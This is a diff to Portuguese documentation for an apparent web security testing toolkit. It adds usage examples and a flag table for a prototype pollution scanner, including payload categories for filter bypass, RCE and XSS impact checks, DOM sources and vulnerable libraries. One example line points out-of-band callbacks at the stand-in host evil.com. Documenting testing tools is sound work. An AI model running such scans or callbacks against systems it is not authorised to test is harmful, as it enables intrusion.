@@ -713,7 +713,19 @@ mytools-protopoll https://example.com -c detect
 mytools-protopoll https://example.com -c constructor
 mytools-protopoll https://example.com -c bypass
 mytools-protopoll https://example.com -c impact
+mytools-protopoll https://example.com -c dom
+mytools-protopoll https://example.com -c library
+mytools-protopoll https://example.com --callback-url https://evil.com/hook
 ```
+
+**Categorias:**
+- `detect` — Payloads basicos de __proto__ e constructor
+- `constructor` — Via constructor.prototype
+- `bypass` — Bypass de filtros (URL encoding, double encoding, nested)
+- `blind` — Deteccao cega via timing/reflection/stored
+- `impact` — Verificacao de impacto (isAdmin, role, settings, RCE, XSS)
+- `dom` — DOM-based: URL params, hash, JSON.parse, referrer, window.name
+- `library` — Bibliotecas: jQuery.extend, Lodash.merge, Vue.js, Angular, Node.js
 
 ### 57. Deserialization Injection (`mytools-deserial`)
 Detecta desserializacao em PHP/Java/Python (O:, pickle, ObjectInputStream).
@@ -1592,6 +1604,13 @@ Disponíveis em módulos que suportam `-l`/`--list`:
 |------|------|--------|-----------|
 | `-c`, `--categories` | `nargs="+"` | `["all"]` | Categorias: `auth_bypass`, `content_type`, `version_enum`, `hateoas`, `all` |
 | `--endpoints` | `nargs="+"` | `None` | Endpoints para testar (default: auto-detect via /openapi.json) |
+| `--concurrency` | `int` | `5` | Requisições simultâneas |
+
+#### `mytools-protopoll` (Prototype Pollution)
+| Flag | Tipo | Padrão | Descrição |
+|------|------|--------|-----------|
+| `-c`, `--category` | `choice` | `None` | Categoria: `detect`, `constructor`, `bypass`, `blind`, `impact`, `dom`, `library` |
+| `--callback-url` | `str` | `None` | URL de callback para detecção out-of-band |
 | `--concurrency` | `int` | `5` | Requisições simultâneas |
 
 ### Compatibilidade de Flags por Tipo de Módulo
